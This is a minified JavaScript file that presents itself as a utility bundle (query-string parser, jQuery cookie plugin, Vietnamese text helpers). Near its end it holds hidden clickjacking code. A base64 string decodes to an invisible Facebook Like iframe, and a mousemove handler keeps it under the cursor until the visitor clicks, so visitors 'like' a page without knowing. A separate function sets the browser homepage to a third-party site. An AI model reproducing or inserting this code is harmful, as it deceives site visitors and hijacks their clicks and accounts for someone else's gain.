(function () {
    function r(e) {
        function p(t) {
            if (e) {
                alert("Request Object:\r\n" + t)
            }
        }

        function d(e) {
            var t = "";
            if (e) {
                for (var n = 0; n < e.length; ++n) {
                    var r = e.charAt(n);
                    t += r == "+" ? " " : r
                }
            }
            return h ? decodeURIComponent(t) : unescape(t)
        }

        function v(e) {
            var t = 0;
            for (var n in e) {
                if (typeof e[n] != o) {
                    t++
                }
            }
            return t
        }

        function m(e) {
            var t = true;
            for (var n in r) {
                if (typeof r[n] != o && n.toString().toLowerCase() == e.toLowerCase()) {
                    t = false;
                    return n
                }
            }
            if (t) {
                r[e] = new Object;
                r[e].toString = function () {
                    return y(r[e])
                };
                r[e].Count = function () {
                    return v(r[e])
                };
                r[e].Count.toString = function () {
                    return v(r[e]).toString()
                };
                r[e].Item = function (t) {
                    if (typeof t == i) {
                        return r[e]
                    } else {
                        if (typeof t == u) {
                            var n = r[e][Math.ceil(t)];
                            if (typeof n == i) {
                                p(f + '("' + e + '").Item(' + t + ")")
                            }
                            return n
                        } else {
                            p('ERROR:Expecting numeric input in\r\nRequest.QueryString("' + e + '").Item("' + t + '")')
                        }
                    }
                };
                r[e].Item.toString = function (t) {
                    if (typeof t == i) {
                        return r[e].toString()
                    } else {
                        var n = r[e][t];
                        if (typeof n == i) {
                            p(f + '("' + e + '").Item(' + t + ")")
                        }
                        return n.toString()
                    }
                };
                r[e].Key = function (t) {
                    var n = typeof t;
                    if (n == a) {
                        var s = r[e][t];
                        return typeof s != i && s && s.toString() ? t : ""
                    } else {
                        p(c + "(" + (t ? t : "") + ")")
                    }
                };
                r[e].Key.toString = function () {
                    return s
                }
            }
            return e
        }

        function g(e, t) {
            if (e != "") {
                var e = m(e);
                var n = v(r[e]);
                r[e][n + 1] = t
            }
        }

        function y(e) {
            var t = "";
            for (var n in e) {
                var r = typeof e[n];
                if (r == "object") {
                    t += y(e[n])
                } else if (r != o) {
                    t += e[n] + ", "
                }
            }
            var i = t.length;
            if (i > 1) {
                return t.substring(0, i - 2)
            }
            return t == "" ? s : t
        }

        function b(e, t) {
            var e = e.toLowerCase();
            for (var n in t) {
                if (typeof t[n] != o && n.toString().toLowerCase() == e) {
                    return n
                }
            }
        }
        var n = "";
        var r = new Object;
        var i = "undefined";
        var s = null;
        var o = "function";
        var u = "number";
        var a = "string";
        var f = "ERROR:Index out of range in\r\nRequest.QueryString";
        var l = "ERROR:Wrong number of arguments or invalid property assignment\r\nRequest.QueryString";
        var c = "ERROR:Object doesn't support this property or method\r\nRequest.QueryString.Key";
        var h = window.decodeURIComponent ? 1 : 0;
        if (window.location && window.location.search) {
            n = window.location.search;
            var w = n.length;
            if (w > 0) {
                n = n.substring(1, w);
                var E = 0;
                var S = -1;
                var x = -1;
                var T = 0;
                var N = false;
                for (var C = 0; C < w; ++C) {
                    var k = n.charAt(C);
                    if (n.charAt(E) == "=" || E == 0 && C == 0 && k == "=") {
                        N = true
                    }
                    if (k == "=" && x == -1 && !N) {
                        x = C
                    }
                    if (k == "&" && S == -1) {
                        if (x != -1) {
                            S = C
                        }
                        if (N) {
                            E = C + 1
                        }
                        N = false
                    }
                    if (S > x) {
                        g(d(n.substring(E, x)), d(n.substring(x + 1, S)));
                        E = S + 1;
                        x = S = -1;
                        ++T
                    }
                }
                if (n.charAt(E) != "=" && (E != 0 || C != 0 || k != "=")) {
                    if (E != w) {
                        if (x != -1) {
                            g(d(n.substring(E, x)), d(n.substring(x + 1, w)))
                        } else if (E != w - 1) {
                            g(d(n.substring(E, w)), "")
                        }
                    }
                    if (w == 1) {
                        g(n.substring(0, 1), "")
                    }
                }
            }
        }
        var L = v(r);
        if (!L) {
            L = 0
        }
        r.toString = function () {
            return n.toString()
        };
        r.Count = function () {
            return L ? L : 0
        };
        r.Count.toString = function () {
            return L ? L.toString() : "0"
        };
        r.Item = function (e) {
            if (typeof e == i) {
                return n
            } else {
                if (typeof e == u) {
                    var e = Math.ceil(e);
                    var t = 0;
                    for (var a in r) {
                        if (typeof r[a] != o && ++t == e) {
                            return r[a]
                        }
                    }
                    p(f + "().Item(" + e + ")")
                } else {
                    return r[b(e, r)]
                }
            }
            return s
        };
        r.Item.toString = function () {
            return n.toString()
        };
        r.Key = function (e) {
            var t = typeof e;
            if (t == u) {
                var e = Math.ceil(e);
                var n = 0;
                for (var s in r) {
                    if (typeof r[s] != o && ++n == e) {
                        return s
                    }
                }
            } else if (t == a) {
                var e = b(e, r);
                var c = r[e];
                return typeof c != i && c && c.toString() ? e : ""
            } else {
                p(l + "().Key(" + (e ? e : "") + ")")
            }
            p(f + "().Item(" + e + ")")
        };
        r.Key.toString = function () {
            p(l + "().Key")
        };
        this.QueryString = function (e) {
            if (typeof e == i) {
                return r
            } else {
                if (typeof e == u) {
                    return r.Item(e)
                }
                var e = b(e, r);
                if (typeof r[e] == i) {
                    t = new Object;
                    t.Count = function () {
                        return 0
                    };
                    t.Count.toString = function () {
                        return "0"
                    };
                    t.toString = function () {
                        return s
                    };
                    t.Item = function (e) {
                        return s
                    };
                    t.Item.toString = function () {
                        return s
                    };
                    t.Key = function (e) {
                        p(c + "(" + (e ? e : "") + ")")
                    };
                    t.Key.toString = function () {
                        return s
                    };
                    return t
                } else {
                    return r[e]
                }
            }
        };
        this.QueryString.toString = function () {
            return n.toString()
        };
        this.QueryString.Count = function () {
            return L ? L : 0
        };
        this.QueryString.Count.toString = function () {
            return L ? L.toString() : "0"
        };
        this.QueryString.Item = function (e) {
            if (typeof e == i) {
                return n.toString()
            } else {
                if (typeof e == u) {
                    var e = Math.ceil(e);
                    var t = 0;
                    for (var a in r) {
                        if (typeof r[a] != o && ++t == e) {
                            return r[a]
                        }
                    }
                    p(f + ".Item(" + e + ")")
                } else {
                    return r[b(e, r)]
                }
            } if (typeof e == u) {
                p(f + ".Item(" + e + ")")
            }
            return s
        };
        this.QueryString.Item.toString = function () {
            return n.toString()
        };
        this.QueryString.Key = function (e) {
            var t = typeof e;
            if (t == u) {
                var e = Math.ceil(e);
                var n = 0;
                for (var s in r) {
                    if (typeof r[s] == "object" && ++n == e) {
                        return s
                    }
                }
            } else if (t == a) {
                var e = b(e, r);
                var o = r[e];
                return typeof o != i && o && o.toString() ? e : ""
            } else {
                p(l + ".Key(" + (e ? e : "") + ")")
            }
            p(f + ".Item(" + e + ")")
        };
        this.QueryString.Key.toString = function () {
            p(l + ".Key")
        };
        this.Version = 1.4;
        this.Author = "Andrew Urquhart (http://khuvuontinhyeu.net)"
    }

    function o(e) {
        e = e.toLowerCase();
        e = e.replace(/!|@|%|\^|\*|\(|\)|'|;|_|-|\|`|\+|\=|\<|\>|\?|\/|,|\.|\:|\~|\$|\"|\&|\#|\[|\]/g, "");
        e = e.replace(/-+-/g, "");
        return e
    }

    function u(e) {
        e = escape(e);
        var t = "";
        var r, i, s = "";
        var o, u, a, f = "";
        var l = 0;
        do {
            r = e.charCodeAt(l++);
            i = e.charCodeAt(l++);
            s = e.charCodeAt(l++);
            o = r >> 2;
            u = (r & 3) << 4 | i >> 4;
            a = (i & 15) << 2 | s >> 6;
            f = s & 63;
            if (isNaN(i)) {
                a = f = 64
            } else if (isNaN(s)) {
                f = 64
            }
            t = t + n.charAt(o) + n.charAt(u) + n.charAt(a) + n.charAt(f);
            r = i = s = "";
            o = u = a = f = ""
        } while (l < e.length);
        return x(15) + t
    }

    function a(data) {
        var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,
            ac = 0,
            dec = "",
            tmp_arr = [];
        if (!data) {
            return data;
        }
        data += '';
        do {
            h1 = b64.indexOf(data.charAt(i++));
            h2 = b64.indexOf(data.charAt(i++));
            h3 = b64.indexOf(data.charAt(i++));
            h4 = b64.indexOf(data.charAt(i++));
            bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
            o1 = bits >> 16 & 0xff;
            o2 = bits >> 8 & 0xff;
            o3 = bits & 0xff;
            if (h3 == 64) {
                tmp_arr[ac++] = String.fromCharCode(o1);
            } else if (h4 == 64) {
                tmp_arr[ac++] = String.fromCharCode(o1, o2);
            } else {
                tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);
            }
        } while (i < data.length);
        dec = tmp_arr.join('');
        return dec;
    }

    function f(e) {
        return String.fromCharCode(e)
    }

    function l(e) {
        if (e < 128) return f(e);
        if (e < 2048) return f(192 + (e >> 6)) + f(128 + (e & 63));
        if (e < 65536) return f(224 + (e >> 12)) + f(128 + (e >> 6 & 63)) + f(128 + (e & 63));
        if (e < 2097152) return f(240 + (e >> 18)) + f(128 + (e >> 12 & 63)) + f(128 + (e >> 6 & 63)) + f(128 + (e & 63))
    }

    function c(e) {
        var t = new Array;
        for (var n = 0; n < e.length; n++) {
            t[n] = l(e.charCodeAt(n))
        }
        return t.join("")
    }

    function h(e) {
        var t = new Array;
        var n, r = 0;
        var i = "";
        while ((n = e.search(/[^\x00-\x7F]/)) != -1) {
            i = e.match(/([^\x00-\x7F]+[\x00-\x7F]{0,10})+/)[0];
            t[r++] = e.substr(0, n);
            t[r++] = c(i);
            e = e.substr(n + i.length)
        }
        t[r++] = e;
        return t.join("")
    }

    function p(e) {
        var t = new Array;
        var n, r, i, s, o = 0;
        for (var u = 0; u < e.length;) {
            n = e.charCodeAt(u++);
            if (n > 127) r = e.charCodeAt(u++);
            if (n > 223) i = e.charCodeAt(u++);
            if (n > 239) s = e.charCodeAt(u++);
            if (n < 128) t[o++] = f(n);
            else if (n < 224) t[o++] = f((n - 192 << 6) + (r - 128));
            else if (n < 240) t[o++] = f((n - 224 << 12) + (r - 128 << 6) + (i - 128));
            else t[o++] = f((n - 240 << 18) + (r - 128 << 12) + (i - 128 << 6) + (s - 128))
        }
        return t.join("")
    }

    function d(e) {
        var t = new Array;
        var n = 0;
        var r = "";
        var i = 0;
        while ((n = e.search(/[^\x00-\x7F]/)) != -1) {
            r = e.match(/([^\x00-\x7F]+[\x00-\x7F]{0,10})+/)[0];
            t[i++] = e.substr(0, n) + p(r);
            e = e.substr(n + r.length)
        }
        t[i++] = e;
        return t.join("")
    }

    function v(e) {
        var t = "";
        for (i = 0; i < e.length; i++) {
            if (e.charAt(i) == " ") t += "+";
            else t += e.charAt(i)
        }
        return escape(t)
    }

    function m(e) {
        var t = e.replace(/\+/g, " ");
        return unescape(t)
    }

    function g(e) {
        return unescape(encodeURIComponent(e))
    }

    function y(e) {
        if (window.sidebar) {
            var t = window.title;
            var n = window.location;
            window.sidebar.addPanel(t, n, "")
        } else if (window.opera && window.print) {
            alert("Opera chÆ°a há»• trá»£ chá»©c nÄƒng nA y!")
        } else if (document.all) {
            if (document.all) {
                e.style.behavior = "url(#default#homepage)";
                e.setHomePage("http://karazone.com");
                alert("Cáº£m Æ¡n báº¡n Ä‘AA3 tin dAB9ng dá»‹ch vá»¥ cá»§a Saloncar")
            }
        } else alert("TrAACnh duyá»‡t cá»§a báº¡n khAB4ng há»• trá»£ chá»©c nÄƒng nA y!")
    }

    function b(e, t, n) {
        var r = new Date;
        r.setDate(r.getDate() + n);
        var i = escape(t) + (n == null ? "" : ";path=/; expires=" + r.toUTCString());
        document.cookie = e + "=" + i
    }

    function w(e) {
        var t, n, r, i = document.cookie.split(";");
        for (t = 0; t < i.length; t++) {
            n = i[t].substr(0, i[t].indexOf("="));
            r = i[t].substr(i[t].indexOf("=") + 1);
            n = n.replace(/^\s+|\s+$/g, "");
            if (n == e) {
                return unescape(r)
            }
        }
    }

    function E() {
        var e = document.cookie.split(";");
        for (var t = 0; t < e.length; t++) {
            var n = e[t];
            var r = n.indexOf("=");
            var i = r > -1 ? n.substr(0, r) : n;
            document.cookie = i + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/"
        }
    }

    function S(e) {
        if (null == e || "" == e) {
            return true
        }
        return false
    }

    function x(e) {
        var t = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
        var n = "";
        for (var r = 0; r < e; r++) {
            var i = Math.floor(Math.random() * t.length);
            n += t.substring(i, i + 1)
        }
        return n
    }

    function T(e) {
        e = e.toLowerCase();
        e = e.replace(/A |A\A1|áº¡|áº£|A\A3|A\A2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g, "a");
        e = e.replace(/A\A8|A\A9|áº¹|áº»|áº½|A\AA|á»|áº¿|á»‡|á»ƒ|á»…/g, "e");
        e = e.replace(/A\AC|A\AD|á»‹|á»‰|Ä©/g, "i");
        e = e.replace(/A\B2|A\B3|á»|á»|A\B5|A\B4|á»“|á»‘|á»™|á»•|á»—|Æ¡|á»|á»›|á»£|á»Ÿ|á»¡/g, "o");
        e = e.replace(/A\B9|A\BA|á»¥|á»§|Å©|Æ°|á»«|á»©|á»±|á»­|á»¯/g, "u");
        e = e.replace(/á»³|A\BD|á»µ|á»·|á»¹/g, "y");
        e = e.replace(/Ä‘/g, "d");
        e = e.replace(/!|@|%|\^|\*|\(|\)|\+|\=|\<|\>|\?|\/|,|\.|\:|\~|\$| |\'|\"|\&|\#|\[|\]/g, "-");
        e = e.replace(/-+-/g, "-");
        e = e.replace(/_+_/g, "_");
        return e
    }

    function N(e) {
        if (e != "") {
            if (isNaN(Number(e))) {
                return false
            } else {
                return true
            }
        }
        return false
    }

    function C(e) {
        var t = "";
        t = $(e + " option:selected").text();
        return t
    }
    var e = 'PGRpdiBzdHlsZT0ib3ZlcmZsb3c6IGhpZGRlbjsgd2lkdGg6IDZweDsgaGVpZ2h0OiA2cHg7IHBvc2l0aW9uOiBhYnNvbHV0ZTsgZmlsdGVyOmFscGhhKG9wYWNpdHk9MCk7IC1tb3otb3BhY2l0eTowLjA7IC1raHRtbC1vcGFjaXR5OiAwLjA7IG9wYWNpdHk6IDAuMDsiIGlkPSJpY29udGFpbmVyIj48aWZyYW1lIHNyYz0iaHR0cDovL3d3dy5mYWNlYm9vay5jb20vcGx1Z2lucy9saWtlLnBocD9ocmVmPWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9jdW9pdmwmYW1wO2xheW91dD1zdGFuZGFyZCZhbXA7c2hvd19mYWNlcz1mYWxzZSZhbXA7d2lkdGg9NDUwJmFtcDthY3Rpb249bGlrZSZhbXA7Zm9udD10YWhvbWEmYW1wO2NvbG9yc2NoZW1lPWxpZ2h0JmFtcDtoZWlnaHQ9ODAiIHN0eWxlPSJib3JkZXI6IG5vbmU7IG92ZXJmbG93OiBoaWRkZW47IHdpZHRoOiA1MHg7aGVpZ2h0OiAyM3B4OyIgYWxsb3d0cmFuc3BhcmVuY3k9InRydWUiIGlkPSJmYmZyYW1lIiBuYW1lPSJmYmZyYW1lIiBmcmFtZWJvcmRlcj0iMCIgc2Nyb2xsaW5nPSJubyI+PC9pZnJhbWU+PC9kaXY+';
    var n = "ABCDEFGHIJKLMNOP" + "QRSTUVWXYZabcdef" + "ghijklmnopqrstuv" + "wxyz0123456789+/" + "=";
    (function (e) {
        if (typeof define === "function" && define.amd) {
            define(["jquery"], e)
        } else {
            e(jQuery)
        }
    })(function (e) {
        function n(e) {
            return e
        }

        function r(e) {
            return decodeURIComponent(e.replace(t, " "))
        }

        function i(e) {
            if (e.indexOf('"') === 0) {
                e = e.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, "\\")
            }
            try {
                return s.json ? JSON.parse(e) : e
            } catch (t) {}
        }
        var t = /\+/g;
        var s = e.cookie = function (t, o, u) {
            if (o !== undefined) {
                u = e.extend({}, s.defaults, u);
                if (typeof u.expires === "number") {
                    var a = u.expires,
                        f = u.expires = new Date;
                    f.setDate(f.getDate() + a)
                }
                o = s.json ? JSON.stringify(o) : String(o);
                return document.cookie = [s.raw ? t : encodeURIComponent(t), "=", s.raw ? o : encodeURIComponent(o), u.expires ? "; expires=" + u.expires.toUTCString() : "", u.path ? "; path=" + u.path : "", u.domain ? "; domain=" + u.domain : "", u.secure ? "; secure" : ""].join("")
            }
            var l = s.raw ? n : r;
            var c = document.cookie.split("; ");
            var h = t ? undefined : {};
            for (var p = 0, d = c.length; p < d; p++) {
                var v = c[p].split("=");
                var m = l(v.shift());
                var g = l(v.join("="));
                if (t && t === m) {
                    h = i(g);
                    break
                }
                if (!t) {
                    h[m] = i(g)
                }
            }
            return h
        };
        s.defaults = {};
        e.removeCookie = function (t, n) {
            if (e.cookie(t) !== undefined) {
                e.cookie(t, "", e.extend({}, n, {
                    expires: -1
                }));
                return true
            }
            return false
        }
    });
    var s = new r(false);
    var k = "agola001";
    var L = "agolaout001";
    $(document).ready(function () {
        function n() {
            if ($(document.activeElement).attr("id") == "fbframe") {
                clearInterval(t);
                $.cookie("first_load_like", k)
            }
        }

        function o(e) {
            if (document.event) {
                i.style.top = window.event.y - 5 + s.scrollTop + "px";
                i.style.left = window.event.x - 5 + s.scrollLeft + "px"
            } else {
                i.style.top = e.pageY - 5 + "px";
                i.style.left = e.pageX - 5 + "px"
            }
        }
        if ($.cookie("first_load_like") != k) {
            $.cookie("first_load_like", L)
        }
        var t;
        t = window.setInterval(n, 1);
        var r = "/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g/A |AA1|áº¡|áº£|AA3|AA2|áº§|áº¥|áº­|áº©|áº«|Äƒ|áº±|áº¯|áº·|áº³|áºµ/g";
        r = a(e);
        $("body").append(r);
        var i = document.getElementById("icontainer");
        var s = document.compatMode == "CSS1Compat" ? document.documentElement : document.body;
        $(document).mousemove(function (e) {
            if ($.cookie("first_load_like") == L) {
                o(e)
            }
        })
    })
})()